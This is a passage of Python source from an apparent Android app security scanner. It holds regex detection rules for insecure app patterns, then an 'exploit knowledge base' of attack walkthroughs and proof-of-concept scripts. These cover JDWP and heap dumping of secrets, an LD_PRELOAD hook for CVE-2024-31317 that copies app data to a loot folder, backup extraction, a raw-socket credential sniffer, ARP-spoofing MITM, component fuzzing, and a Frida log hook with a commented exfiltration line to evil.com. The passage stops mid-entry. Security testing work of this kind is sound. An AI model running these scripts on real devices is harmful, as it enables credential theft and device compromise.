    {"id":"AV-ZD-039","name":"SingleTask Exported Activity","sev":"HIGH","cwe":"CWE-1021","owasp":"M1","regex":r'(?i)android:launchMode\s*=\s*"singleTask"',"types":["MANIFEST"],"desc":"SingleTask launch mode enables StrandHogg task hijacking attacks.","fix":"Avoid singleTask with exported. Set taskAffinity to empty.","cvss":7.8},
    {"id":"AV-ZD-040","name":"Missing Tapjacking Protection","sev":"MEDIUM","cwe":"CWE-1021","owasp":"M1","regex":r'(?i)filterTouchesWhenObscured\s*=\s*"false"',"types":["RESOURCE"],"desc":"Screen explicitly disables overlay attack protection.","fix":"Set android:filterTouchesWhenObscured=true on sensitive views.","cvss":4.3},
    {"id":"AV-ZD-041","name":"Hardcoded Google API Key","sev":"HIGH","cwe":"CWE-798","owasp":"M9","regex":r'AIza[0-9A-Za-z_-]{35}',"types":["SOURCE","RESOURCE"],"desc":"Google API key extractable via decompilation for quota abuse.","fix":"Restrict key by package SHA1 in Google Cloud Console.","cvss":7.5},
    {"id":"AV-ZD-042","name":"Deprecated TLS Version","sev":"HIGH","cwe":"CWE-326","owasp":"M3","regex":r'(?i)(TLSv1["\s,]|SSLv3|TLSv1\.0|TLSv1\.1)',"types":["SOURCE","RESOURCE"],"desc":"Deprecated TLS version enabled vulnerable to POODLE/BEAST.","fix":"Enforce TLS 1.2+ minimum version.","cvss":7.4},
    {"id":"AV-ZD-043","name":"Location Data Leak","sev":"HIGH","cwe":"CWE-319","owasp":"M2","regex":r'(?i)(getLatitude|getLongitude|getLastKnownLocation)\s*\(\s*\)',"types":["SOURCE"],"desc":"GPS coordinates accessed - verify encrypted transmission only.","fix":"Encrypt location data in transit and at rest. Use HTTPS.","cvss":7.5},
    {"id":"AV-ZD-044","name":"Runtime Code Patching","sev":"HIGH","cwe":"CWE-94","owasp":"M8","regex":r'(?i)(InMemoryDexClassLoader|defineClass|Unsafe\.(put|get)|allocateInstance)',"types":["SOURCE"],"desc":"Runtime code modification primitives for runtime patching.","fix":"Verify code integrity. Use APK signature verification.","cvss":8.1},
    {"id":"AV-ZD-045","name":"Unsafe Binder IPC","sev":"HIGH","cwe":"CWE-269","owasp":"M1","regex":r'(?i)onTransact\s*\(\s*int\s+\w+\s*,',"types":["SOURCE"],"desc":"Binder IPC handler without caller permission enforcement.","fix":"Call enforceCallingOrSelfPermission() in onTransact.","cvss":7.8},
    {"id":"AV-ZD-046","name":"HTTP Download Manager","sev":"HIGH","cwe":"CWE-494","owasp":"M3","regex":r'(?i)DownloadManager.*Request\s*\(\s*Uri\.parse\s*\(\s*"http://',"types":["SOURCE"],"desc":"Download Manager fetches files over unencrypted HTTP.","fix":"Use HTTPS URLs for all downloads.","cvss":7.4},
    {"id":"AV-ZD-047","name":"External Storage Database","sev":"MEDIUM","cwe":"CWE-538","owasp":"M2","regex":r'(?i)(getExternalStorage|getExternalFilesDir|Environment\.getExternal)\s*\([^)]*\).*\.(db|sqlite|realm)',"types":["SOURCE"],"desc":"Database file on external storage readable by all apps.","fix":"Store databases in app-private internal storage only.","cvss":5.3},
    {"id":"AV-ZD-048","name":"ProGuard Disabled","sev":"MEDIUM","cwe":"CWE-656","owasp":"M9","regex":r'(?i)minifyEnabled\s*(=|:)\s*false',"types":["SOURCE","RESOURCE"],"desc":"Code obfuscation disabled. Easy reverse engineering of logic.","fix":"Enable minifyEnabled=true with R8 rules.","cvss":4.3},
    {"id":"AV-ZD-049","name":"HTTP Media Stream","sev":"MEDIUM","cwe":"CWE-319","owasp":"M3","regex":r'(?i)(MediaPlayer|ExoPlayer|VideoView).*http://',"types":["SOURCE"],"desc":"Media content loaded over unencrypted HTTP. Injection possible.","fix":"Use HTTPS for all media streams.","cvss":5.9},
    {"id":"AV-ZD-050","name":"Overly Broad URI Permission Grant","sev":"HIGH","cwe":"CWE-862","owasp":"M1","regex":r'(?i)android:grantUriPermissions\s*=\s*"true"',"types":["MANIFEST"],"desc":"Provider grants URI permissions broadly to all callers.","fix":"Use path-specific grant-uri-permission elements instead.","cvss":7.5},
    # ══════════════════════════════════════════════════════════════
    #  25 NEXT-GEN ZERO-DAY RULES (2026 Advanced Attack Surfaces)
    #  Targets: Jetpack Compose, Kotlin Coroutines, CameraX, ML Kit,
    #  Health Connect, Credential Manager, Predictive Back, etc.
    # ══════════════════════════════════════════════════════════════
    {"id":"AV-ZD-051","name":"Jetpack Compose State Injection via SavedState","sev":"HIGH","cwe":"CWE-502","owasp":"M7","regex":r'(?i)(rememberSaveable|SavedStateHandle)\s*[({].*?(getIntent|getArguments|getString)',"types":["SOURCE"],"desc":"Compose UI state restored from untrusted SavedStateHandle backed by Intent extras. Attacker crafts Intent to inject arbitrary state into composables, bypassing UI validation.","fix":"Validate all values from SavedStateHandle. Use typed access with defaults. Never trust restored state for security decisions.","cvss":7.8},
    {"id":"AV-ZD-052","name":"Kotlin Coroutine Scope Leak via GlobalScope","sev":"HIGH","cwe":"CWE-404","owasp":"M7","regex":r'(?i)GlobalScope\.(launch|async)\s*[({].*?(decrypt|password|token|secret|key|auth)',"types":["SOURCE"],"desc":"Security-sensitive coroutine launched in GlobalScope persists beyond Activity lifecycle. Credentials remain in memory indefinitely, extractable via heap dump even after logout.","fix":"Use viewModelScope or lifecycleScope. Clear sensitive data in onCleared(). Use withContext(NonCancellable) only for cleanup.","cvss":7.5},
    {"id":"AV-ZD-053","name":"WorkManager Task Data Exposure","sev":"HIGH","cwe":"CWE-312","owasp":"M2","regex":r'(?i)(OneTimeWorkRequest|PeriodicWorkRequest|workDataOf|Data\.Builder).*?(token|password|secret|api_key|bearer|credential)',"types":["SOURCE"],"desc":"Sensitive credentials passed in WorkManager Data object. WorkManager persists Data to Room database (app_db/work_db) in plaintext, surviving app restart and extractable via backup or root.","fix":"Never pass secrets in WorkManager Data. Use encrypted references (key IDs) and fetch secrets inside Worker. Use EncryptedSharedPreferences for credential storage.","cvss":7.5},
    {"id":"AV-ZD-054","name":"Credential Manager Phishing Surface","sev":"CRITICAL","cwe":"CWE-346","owasp":"M4","regex":r'(?i)(CredentialManager|GetCredentialRequest|CreatePasswordRequest|GetPasswordOption)\s*[.(]',"types":["SOURCE"],"desc":"App uses Credential Manager API. If origin validation is misconfigured, a malicious app with matching intent-filter can trick the credential provider into auto-filling passwords to the attacker's phishing WebView.","fix":"Verify calling app signature in credential provider. Use Digital Asset Links. Implement GetCredentialRequest with strict origin binding.","cvss":9.1},
    {"id":"AV-ZD-055","name":"Foreground Service Type Camera/Microphone Abuse","sev":"HIGH","cwe":"CWE-284","owasp":"M1","regex":r'(?i)android:foregroundServiceType\s*=\s*"[^"]*?(camera|microphone|mediaProjection)[^"]*"',"types":["MANIFEST"],"desc":"Foreground service declares camera/microphone/mediaProjection type. On Android 14+, if exported or triggerable via implicit intent, malicious app can force-start the service to activate recording without user awareness.","fix":"Never export foreground services with media types. Validate caller UID in onStartCommand(). Require signature-level permission.","cvss":8.1},
    {"id":"AV-ZD-056","name":"Photo Picker URI Persistence Attack","sev":"HIGH","cwe":"CWE-862","owasp":"M2","regex":r'(?i)(registerForActivityResult|PickVisualMedia|OpenDocument).*?(takePersistableUriPermission|FLAG_GRANT_READ_URI_PERMISSION)',"types":["SOURCE"],"desc":"App takes persistable URI permission on photo picker results. If combined with a content:// redirect vulnerability, attacker gains permanent read access to arbitrary files through the persisted grant.","fix":"Only take persistable URI permissions when strictly needed. Revoke with releasePersistableUriPermission() after use. Validate URI authority matches expected provider.","cvss":7.8},
    {"id":"AV-ZD-057","name":"Bluetooth LE Unencrypted Characteristic","sev":"HIGH","cwe":"CWE-319","owasp":"M3","regex":r'(?i)(BluetoothGattCharacteristic|writeCharacteristic|readCharacteristic).*?(PERMISSION_READ|PERMISSION_WRITE|PROPERTY_WRITE_NO_RESPONSE)',"types":["SOURCE"],"desc":"BLE GATT characteristic accessed without encryption requirement. Attacker within BLE range (~100m) can sniff or inject data via passive monitoring or MITM relay attack on unencrypted characteristics.","fix":"Require PERMISSION_READ_ENCRYPTED / PERMISSION_WRITE_ENCRYPTED. Implement app-layer encryption for BLE data. Use createBond() for pairing.","cvss":7.4},
    {"id":"AV-ZD-058","name":"ML Model Input Tampering Surface","sev":"HIGH","cwe":"CWE-20","owasp":"M7","regex":r'(?i)(Interpreter|TFLite|loadModel|ModelInterpreter|OnnxRuntime)\s*[.(].*?(getIntent|getExtra|external|download|Uri)',"types":["SOURCE"],"desc":"ML/AI model loaded from untrusted source (Intent, download, external storage). Attacker substitutes adversarial model that produces manipulated predictions — bypasses fraud detection, facial recognition, or content filtering.","fix":"Ship models in APK assets with integrity check. If downloaded, verify SHA-256 hash against pinned value. Use ML Model Binding with signature verification.","cvss":8.1},
    {"id":"AV-ZD-059","name":"Notification Listener Credential Theft","sev":"CRITICAL","cwe":"CWE-200","owasp":"M2","regex":r'(?i)(NotificationListenerService|onNotificationPosted)\s*[({]',"types":["SOURCE"],"desc":"App implements NotificationListenerService granting access to ALL device notifications including OTP codes, 2FA tokens, banking alerts, and password reset links from every app. Single most powerful Android surveillance surface.","fix":"Minimize data read from notifications. Never log notification content. Implement strict data handling. Justify the permission to users transparently.","cvss":9.1},
    {"id":"AV-ZD-060","name":"Content Provider Call Method Injection","sev":"CRITICAL","cwe":"CWE-78","owasp":"M7","regex":r'(?i)(ContentProvider|contentResolver)\.call\s*\([^)]*?(getExtra|getString|intent|param|input|uri)',"types":["SOURCE"],"desc":"ContentProvider.call() dispatches to arbitrary internal methods using user-controlled 'method' string from Intent. Attacker invokes hidden/dangerous provider methods not exposed through standard query/insert/update/delete interface.","fix":"Whitelist allowed method names in call(). Check Binder.getCallingUid(). Never route call() to exec/eval/reflection dynamically.","cvss":9.8},
    {"id":"AV-ZD-061","name":"Predictive Back Gesture Auth Bypass","sev":"HIGH","cwe":"CWE-287","owasp":"M4","regex":r'(?i)(OnBackPressedCallback|handleOnBackPressed|onBackInvoked).*?(finish|popBackStack|navigate)',"types":["SOURCE"],"desc":"Android 14+ Predictive Back gesture callback calls finish() without re-validating auth state. Attacker triggers back navigation during auth flow to skip PIN/biometric screens that rely on Activity stack ordering for enforcement.","fix":"Re-validate auth state in onResume() of protected activities. Don't rely on back stack order for security. Use crypto-bound session tokens verified server-side.","cvss":7.8},
    {"id":"AV-ZD-062","name":"Scoped Storage Bypass via MediaStore","sev":"HIGH","cwe":"CWE-284","owasp":"M2","regex":r'(?i)(MediaStore|contentResolver\.insert|ContentValues).*?(EXTERNAL_CONTENT_URI|Images\.Media|Video\.Media|Downloads)',"types":["SOURCE"],"desc":"App uses MediaStore to write files to shared external storage. On Android 10-14, other apps can read these files without storage permission via MediaStore queries. Sensitive exports (PDFs, reports, backups) exposed to all apps.","fix":"Store sensitive files in app-private getFilesDir(). If sharing via MediaStore, use IS_PENDING=1 during write. Never export credentials/backups to MediaStore.","cvss":7.5},
    {"id":"AV-ZD-063","name":"Health Connect Unprotected Write","sev":"HIGH","cwe":"CWE-284","owasp":"M2","regex":r'(?i)(HealthConnectClient|writeRecords|insertRecords|HeartRateRecord|StepsRecord|BloodPressureRecord|WeightRecord)',"types":["SOURCE"],"desc":"App writes health data (heart rate, blood pressure, steps) to Health Connect without adequate integrity verification. Malicious app with WRITE permission can inject fabricated health records affecting medical decisions.","fix":"Sign health records with app-specific HMAC. Implement server-side validation. Alert user to data provenance. Use READ_HEALTH_DATA_IN_BACKGROUND sparingly.","cvss":7.5},
    {"id":"AV-ZD-064","name":"DataStore Proto Deserialization from External","sev":"HIGH","cwe":"CWE-502","owasp":"M7","regex":r'(?i)(DataStore|Proto|Serializer|readFrom|writeTo)\s*[({].*?(stream|external|download|intent|uri|getExtra)',"types":["SOURCE"],"desc":"Jetpack DataStore/Proto deserialization from untrusted source. Malformed protobuf can trigger OOM, stack overflow, or field confusion attacks. If proto schema has oneof fields, type confusion enables data corruption.","fix":"Never deserialize DataStore from external input. Validate proto size limits. Use try-catch around readFrom(). Store DataStore in internal storage only.","cvss":7.8},
    {"id":"AV-ZD-065","name":"CameraX ImageAnalysis Frame Leak","sev":"HIGH","cwe":"CWE-200","owasp":"M2","regex":r'(?i)(ImageAnalysis|Analyzer|analyze)\s*\([^)]*ImageProxy',"types":["SOURCE"],"desc":"CameraX ImageAnalysis processes every camera frame. If frames are logged, cached, or sent to analytics/ML without user knowledge, it constitutes covert visual surveillance. Frames may contain faces, documents, screens, or private spaces.","fix":"Process frames in memory only; never persist to disk. Show clear camera-active indicator. Comply with GDPR Article 9 for biometric data. Close ImageProxy immediately after analysis.","cvss":7.5},
    {"id":"AV-ZD-066","name":"App Links Domain Takeover","sev":"CRITICAL","cwe":"CWE-939","owasp":"M1","regex":r'(?i)<intent-filter[^>]*autoVerify.*?<data[^>]*host\s*=\s*"([^"]*?(\.tk|\.ml|\.ga|\.cf|\.gq|\.xyz|\.top|\.buzz|\.club|staging|dev\.|test\.|beta\.))',"types":["MANIFEST"],"desc":"App Links verified against disposable/staging domain. If domain expires or attacker registers it, they control the assetlinks.json and can steal all app link traffic — OAuth callbacks, password resets, payment confirmations redirected to attacker.","fix":"Only use verified production domains for App Links. Monitor domain expiry. Use HTTPS for all intent-filter data schemes. Remove staging domains before release.","cvss":9.8},
    {"id":"AV-ZD-067","name":"Room Database Migration Code Injection","sev":"HIGH","cwe":"CWE-89","owasp":"M7","regex":r'(?i)(Migration|migrate)\s*[({].*?(execSQL|rawQuery|exec)\s*\([^)]*\+',"types":["SOURCE"],"desc":"Room database migration builds SQL with concatenation. If migration reads data from corrupted/tampered old database, attacker injects SQL into migration step — executes with app permissions during upgrade.","fix":"Use parameterized queries in migrations. Validate old DB data before concatenation. Use Room's auto-migration where possible.","cvss":8.1},
    {"id":"AV-ZD-068","name":"Accessibility Service Data Harvest","sev":"CRITICAL","cwe":"CWE-200","owasp":"M2","regex":r'(?i)(AccessibilityService|onAccessibilityEvent|AccessibilityNodeInfo)\s*[({]',"types":["SOURCE"],"desc":"App implements AccessibilityService — can read ALL text on screen in real-time including passwords being typed, banking balances, private messages, health data. Most powerful single Android permission. Used by 95% of Android banking trojans.","fix":"Justify Accessibility use case narrowly. Filter events by packageName. Never log AccessibilityNodeInfo text. Implement tight eventTypes filtering. Consider using Autofill API instead.","cvss":9.8},
    {"id":"AV-ZD-069","name":"VPN Service Traffic Interception Surface","sev":"CRITICAL","cwe":"CWE-319","owasp":"M3","regex":r'(?i)(VpnService|establish\s*\(\s*\)|Builder.*?addAddress|tun0|protect\s*\(\s*)',"types":["SOURCE"],"desc":"App implements VpnService gaining access to ALL network traffic on the device. Can intercept HTTPS via custom CA, read DNS queries, log every connection. If app is compromised, attacker has full network surveillance capability.","fix":"Minimize VPN data retention. Never log traffic content. Implement independent security audits. Publish transparency reports. Use minimal routing (split tunnel).","cvss":9.8},
    {"id":"AV-ZD-070","name":"Companion Device Manager Session Hijack","sev":"HIGH","cwe":"CWE-384","owasp":"M1","regex":r'(?i)(CompanionDeviceManager|AssociationRequest|associate)\s*\(',"types":["SOURCE"],"desc":"App uses CompanionDeviceManager for BLE/WiFi device association. Post-association, the companion app gets persistent background access without user awareness. If session management is weak, attacker intercepts BLE advertisements to hijack the paired session.","fix":"Implement mutual authentication post-association. Rotate session keys. Monitor for replay attacks. Require re-confirmation for sensitive companion commands.","cvss":7.8},
    {"id":"AV-ZD-071","name":"ContentProvider Paging Cursor Injection","sev":"HIGH","cwe":"CWE-89","owasp":"M7","regex":r'(?i)(MatrixCursor|MergeCursor|CrossProcessCursor|AbstractCursor|CursorWrapper)\s*[({].*?(getIntent|getExtra|getString|param|input)',"types":["SOURCE"],"desc":"Custom Cursor implementation in ContentProvider built from external input. Attacker queries provider with crafted projection/selection to leak cursor data from adjacent rows (side-channel) or cause type confusion in cursor column types.","fix":"Never build cursors dynamically from user input. Use fixed column schemas. Validate projection parameter against allowlist. Set strictColumnNames in ContentProvider.","cvss":7.5},
    {"id":"AV-ZD-072","name":"Unsafe Jetpack Navigation DeepLink","sev":"HIGH","cwe":"CWE-601","owasp":"M1","regex":r'(?i)(NavDeepLink|deepLink|navArgument)\s*[({].*?(argument|navArgs|getString|getInt)',"types":["SOURCE"],"desc":"Jetpack Navigation deep link passes unvalidated arguments to destination fragments/composables. Attacker crafts deep link URL with argument values that bypass expected navigation flow — accessing admin screens, skipping payment verification, or injecting displayed content.","fix":"Validate all navArgs in destination. Set argument type constraints. Use defaultValue with safe fallbacks. Never use navArgs for auth decisions.","cvss":7.8},
    {"id":"AV-ZD-073","name":"Unsafe Biometric CryptoObject Bypass","sev":"CRITICAL","cwe":"CWE-287","owasp":"M4","regex":r'(?i)BiometricPrompt.*authenticate\s*\([^)]*PromptInfo[^)]*\)(?!.*CryptoObject)',"types":["SOURCE"],"desc":"BiometricPrompt.authenticate() called with PromptInfo only (no CryptoObject). Auth result is purely software boolean — trivially bypassed with Frida by calling onAuthenticationSucceeded() directly. No cryptographic proof of biometric match exists.","fix":"ALWAYS pass CryptoObject wrapping a Keystore key with setUserAuthenticationRequired(true). This creates hardware-backed proof that biometric actually matched. Without CryptoObject, biometric is security theater.","cvss":9.1},
    {"id":"AV-ZD-074","name":"Implicit Export via Intent Filter (Android 12+)","sev":"HIGH","cwe":"CWE-862","owasp":"M1","regex":r'(?i)<(activity|service|receiver)[^>]*>\s*<intent-filter[^>]*>(?![^<]*exported)',"types":["MANIFEST"],"desc":"Component declares intent-filter without explicit android:exported attribute. On Android 12+ (targetSdk 31+) this crashes, but on older targetSdk it defaults to exported=true — silently exposing the component to all apps on the device.","fix":"Always explicitly set android:exported='false' on components with intent-filters that are internal. Set android:exported='true' only when cross-app access is intentionally designed.","cvss":7.5},
    {"id":"AV-ZD-075","name":"Unsafe Pending Intent for Tile/Widget","sev":"HIGH","cwe":"CWE-927","owasp":"M1","regex":r'(?i)(TileService|AppWidgetProvider|RemoteViews).*PendingIntent\.get\w+\s*\([^)]*new\s+Intent\s*\(',"types":["SOURCE"],"desc":"Quick Settings Tile or Home Screen Widget creates PendingIntent with implicit Intent. Any app can add widgets/tiles by cloning configuration. Mutable implicit PendingIntent in widget enables attacker to modify target and steal clicks.","fix":"Use explicit Intents with setComponent() for all widget/tile PendingIntents. Add FLAG_IMMUTABLE. Use FLAG_ONE_SHOT where possible.","cvss":7.8},
]

# ============================================================
#  EXPLOIT KNOWLEDGE BASE  (real-world techniques per finding)
# ============================================================
EXPLOITS = [
    {"vuln":"Debuggable Application","tool":"adb, jdb, JADX, Frida","cves":["CVE-2024-31317","CVE-2024-0044"],
     "steps":"[CVE-2024-31317 + CVE-2024-0044 Chain] Zygote command injection escalates debuggable apps to full device compromise:\n\n1. Confirm debuggable flag:\n   aapt dump badging target.apk | grep -i debuggable\n   adb shell dumpsys package <package> | grep flags | grep DEBUGGABLE\n\n2. JDWP Memory Extraction (classic technique):\n   adb install target.apk && adb shell pidof <package>\n   adb forward tcp:8700 jdwp:<PID>\n   jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700\n   jdb> threads\n   jdb> eval com.app.SecretManager.getApiKey()\n   jdb> eval android.util.Base64.encodeToString(getEncryptionKey(),0)\n\n3. CVE-2024-31317 Escalation (debuggable -> any app):\n   adb shell setprop wrap.<package> 'LD_PRELOAD=/data/local/tmp/hook.so'\n   # Write hook.so that dumps /data/data/<package>/\n   # Force restart: adb shell am force-stop <package>\n   # hook.so executes in <package> process context\n\n4. Runtime Secret Dumping via Frida:\n   frida -U -f <package> --no-pause -e '\n   Java.perform(function(){\n     Java.enumerateLoadedClasses({onMatch:function(c){\n       if(c.includes(\"Config\")||c.includes(\"Secret\")||c.includes(\"Key\")){\n         console.log(\"[+] \"+c);\n       }\n     },onComplete:function(){}});\n   });'\n\n5. Heap Dump & Credential Extraction:\n   adb shell am dumpheap <PID> /data/local/tmp/heap.hprof\n   adb pull /data/local/tmp/heap.hprof\n   strings heap.hprof | grep -iE 'password|token|api.key|bearer|secret'\n\n6. Android Studio Live Debug:\n   Run > Attach Debugger > select <package>\n   Set breakpoints on: onClick, onResponse, getToken, decrypt\n   Inspect all local variables including crypto keys in memory",
     "poc":"#!/bin/bash\n# Full exploit chain: debuggable -> runtime secrets -> CVE-2024-31317 lateral movement\nPKG=<package>\nAPK=target.apk\necho '[*] Phase 1: JDWP Secret Extraction'\nadb install -r $APK && sleep 2\nPID=$(adb shell pidof $PKG)\nadb forward tcp:8700 jdwp:$PID\necho \"[+] JDWP on PID $PID — connect: jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700\"\n\necho '[*] Phase 2: Heap credential dump'\nadb shell am dumpheap $PID /data/local/tmp/heap.hprof\nadb pull /data/local/tmp/heap.hprof /tmp/heap.hprof\necho '[+] Secrets found in heap:'\nstrings /tmp/heap.hprof | grep -iE '(password|token|api.key|bearer|secret|private.key)' | sort -u | head -20\n\necho '[*] Phase 3: CVE-2024-31317 wrap property injection'\ncat > /tmp/hook.c << 'EOF'\n#include <stdio.h>\n__attribute__((constructor)) void init() {\n    system(\"cp /data/data/$PKG/shared_prefs/* /sdcard/loot/\");\n    system(\"cp /data/data/$PKG/databases/* /sdcard/loot/\");\n}\nEOF\nndk-build /tmp/hook.c -o /tmp/hook.so\nadb push /tmp/hook.so /data/local/tmp/\nadb shell setprop wrap.$PKG 'LD_PRELOAD=/data/local/tmp/hook.so'\nadb shell am force-stop $PKG\necho '[+] Loot extracted via CVE-2024-31317 to /sdcard/loot/'"},
    {"vuln":"Backup Enabled","tool":"adb, ABE (Android Backup Extractor)",
     "steps":"1. Trigger backup (no root needed):\n   adb backup -f backup.ab -apk -shared <package>\n2. User confirms on device (tap 'Back up my data')\n3. Extract with ABE:\n   java -jar abe.jar unpack backup.ab backup.tar\n   tar xvf backup.tar\n4. Harvest sensitive data:\n   find apps/<package> -name '*.db' -o -name '*.xml' -o -name '*.json'\n   sqlite3 apps/<package>/db/credentials.db 'SELECT * FROM users;'\n5. Read SharedPreferences:\n   cat apps/<package>/sp/*.xml | grep -i token\\|password\\|session\n6. Modify and restore:\n   tar cvf modified.tar apps/\n   java -jar abe.jar pack modified.tar modified.ab\n   adb restore modified.ab",
     "poc":"#!/bin/bash\n# Automated backup data extraction\nPKG=$1\nif [ -z \"$PKG\" ]; then echo \"Usage: $0 <package.name>\"; exit 1; fi\nadb backup -f /tmp/backup.ab -apk $PKG\necho \"[!] Confirm backup on device NOW\"\nsleep 10\njava -jar abe.jar unpack /tmp/backup.ab /tmp/backup.tar\nmkdir -p /tmp/loot && cd /tmp/loot\ntar xf /tmp/backup.tar\necho \"\\n[+] SharedPreferences:\"\nfind . -name '*.xml' -path '*/sp/*' -exec grep -l 'password\\|token\\|secret\\|key' {} \\;\necho \"\\n[+] Databases:\"\nfind . -name '*.db' -exec sh -c 'echo \"--- {} ---\"; sqlite3 {} \".tables\"' \\;"},
    {"vuln":"Cleartext Traffic","tool":"mitmproxy, tcpdump, Wireshark",
     "steps":"1. Setup transparent proxy:\n   mitmproxy --mode transparent --listen-port 8080\n2. Route device through proxy:\n   adb shell settings put global http_proxy <attacker_ip>:8080\n3. Or use tcpdump on device (root):\n   adb shell tcpdump -i wlan0 -w /sdcard/capture.pcap\n   adb pull /sdcard/capture.pcap\n4. Analyze in Wireshark:\n   Filter: http || tcp.port == 80\n   Look for credentials, tokens, PII in plaintext\n5. Active MITM with arpspoof:\n   arpspoof -i wlan0 -t <device_ip> <gateway_ip>\n   mitmproxy --mode transparent -p 8080",
     "poc":"#!/usr/bin/env python3\n# Passive cleartext traffic sniffer\nimport socket, re\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\nsock.bind(('0.0.0.0', 0))\nsock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\nprint('[*] Sniffing cleartext HTTP traffic...')\nwhile True:\n    data = sock.recvfrom(65565)[0]\n    payload = data[40:].decode('utf-8', errors='ignore')\n    for pattern in ['password=', 'token=', 'session=', 'Authorization:']:\n        if pattern.lower() in payload.lower():\n            print(f'[!] CAPTURED: {payload[:200]}')"},
    {"vuln":"Exported Component","tool":"adb, drozer, Frida","cves":["CVE-2020-0096","CVE-2022-20474","CVE-2024-43093"],
     "steps":"[CVE-2020-0096 StrandHogg 2.0 + CVE-2024-43093 EoP] Exported components enable task hijacking and privilege escalation chains:\n\n1. Enumerate all exported components with drozer:\n   dz> run app.activity.info -a <package> -u\n   dz> run app.service.info -a <package> -u\n   dz> run app.broadcast.info -a <package> -u\n   dz> run app.provider.info -a <package> -u\n\n2. CVE-2020-0096 StrandHogg 2.0 Task Hijacking:\n   Exploit startActivities() to inject attacker activity into target task:\n   adb shell am start -n <package>/.LoginActivity\n   adb shell am start --activity-task-on-home -n attacker/.FakeLogin\n   # User sees attacker's fake login screen on <package>'s task\n\n3. Launch non-exported activities via exported entry points:\n   adb shell am start -n <package>/.admin.DashboardActivity\n   adb shell am start -n <package>/.internal.DebugActivity\n   adb shell am start -n <package>/.dev.DatabaseBrowser\n\n4. CVE-2022-20474 Parcel Mismatch Privilege Escalation:\n   Craft intent with mismatched Bundle serialization to bypass ACLs:\n   # Exploit sends crafted Parcel through exported component\n   # Re-parsing in system_server reads different intent data\n   # Results in launching non-exported activities with system privileges\n\n5. Content Provider Data Exfiltration:\n   adb shell content query --uri content://<package>.provider/users\n   adb shell content query --uri content://<package>.provider/users --where \"1=1\"\n   adb shell content query --uri content://<package>.provider/accounts --projection \"*\"\n\n6. CVE-2024-43093 DocumentsUI Exploitation:\n   Craft malicious document that triggers privilege escalation:\n   adb shell am start -a android.intent.action.VIEW -d content://<package>.fileprovider/exploit\n   # DocumentsUI processes with system privileges",
     "poc":"#!/bin/bash\n# Automated exported component fuzzer\nPKG=$1\necho \"[*] Scanning exported components for $PKG\"\nfor activity in $(adb shell dumpsys package $PKG | grep -A1 'exported=true' | grep -oP '[\\w.]+Activity'); do\n    echo \"[+] Launching: $activity\"\n    adb shell am start -n $PKG/$activity 2>/dev/null\n    sleep 1\ndone\nfor provider in $(adb shell dumpsys package $PKG | grep -oP 'content://[\\w./]+'); do\n    echo \"[+] Querying: $provider\"\n    adb shell content query --uri $provider 2>/dev/null | head -5\ndone"},
    {"vuln":"Hardcoded Secret","tool":"JADX, apktool, trufflehog, nuclei",
     "steps":"1. Decompile:\n   jadx -d output/ target.apk\n2. Search for secrets:\n   grep -rn 'api_key\\|API_KEY\\|secret_key\\|aws_access\\|AIza\\|ghp_\\|sk-' output/\n3. Check BuildConfig:\n   cat output/resources/classes/BuildConfig.java\n4. Scan strings.xml:\n   grep -i 'key\\|secret\\|token\\|password' output/resources/res/values/strings.xml\n5. Base64 decode suspicious strings:\n   echo '<base64_string>' | base64 -d\n6. Test extracted keys:\n   # Firebase: curl https://<project>.firebaseio.com/.json\n   # Google Maps: curl 'https://maps.googleapis.com/maps/api/geocode/json?key=<KEY>&address=test'\n   # AWS: aws sts get-caller-identity --access-key <KEY> --secret-key <SECRET>\n7. Use trufflehog:\n   trufflehog filesystem output/ --json",
     "poc":"#!/usr/bin/env python3\n# Extract and validate hardcoded secrets from decompiled APK\nimport re, os, json, urllib.request\nSECRET_PATTERNS = [\n    (r'AIza[0-9A-Za-z_-]{35}', 'Google API Key'),\n    (r'AKIA[0-9A-Z]{16}', 'AWS Access Key'),\n    (r'ghp_[0-9a-zA-Z]{36}', 'GitHub Token'),\n    (r'sk-[0-9a-zA-Z]{32,}', 'OpenAI/Stripe Key'),\n    (r'firebase[\\w-]+\\.firebaseio\\.com', 'Firebase DB'),\n    (r'-----BEGIN (RSA |EC )?PRIVATE KEY-----', 'Private Key'),\n]\nfor root, dirs, files in os.walk('output'):\n    for fname in files:\n        if fname.endswith(('.java','.xml','.json','.properties')):\n            path = os.path.join(root, fname)\n            content = open(path, 'r', errors='ignore').read()\n            for pattern, label in SECRET_PATTERNS:\n                for m in re.finditer(pattern, content):\n                    print(f'[CRITICAL] {label}: {m.group()[:60]}... in {path}')"},
    {"vuln":"Sensitive Data in Logs","tool":"adb logcat, Frida",
     "steps":"1. Monitor logs in real-time:\n   adb logcat | grep -iE 'password|token|secret|session|credit|ssn|auth'\n2. Filter by app:\n   adb logcat --pid=$(adb shell pidof <package>) | grep -iE 'password|bearer|jwt'\n3. Hook Log class with Frida:\n   frida -U -f <package> -l log_hook.js\n4. Check for sensitive data patterns:\n   adb logcat -d | grep -oP '(Bearer |token=|password=|session_id=)[^\\s]+'\n5. Dump full log history:\n   adb logcat -d > full_log.txt\n   grep -c 'password\\|token\\|secret' full_log.txt",
     "poc":"// Frida script: log_hook.js — intercept all Log calls\nJava.perform(function() {\n    var Log = Java.use('android.util.Log');\n    var methods = ['d','v','i','w','e'];\n    var sensitive = /password|token|secret|bearer|session|credit|ssn|auth_key/i;\n    methods.forEach(function(m) {\n        Log[m].overload('java.lang.String','java.lang.String').implementation = function(tag, msg) {\n            if (sensitive.test(msg)) {\n                console.log('[!!! LEAK] ' + tag + ': ' + msg);\n                // Send to attacker server:\n                // var url = 'https://evil.com/log?data=' + encodeURIComponent(msg);\n            }\n            return this[m](tag, msg);\n        };\n    });\n    console.log('[*] Log hooks installed — monitoring sensitive data leaks');\n});"},
    {"vuln":"Trust All Certificates","tool":"mitmproxy, Burp Suite, Frida","cves":["CVE-2021-0341","CVE-2020-0096"],
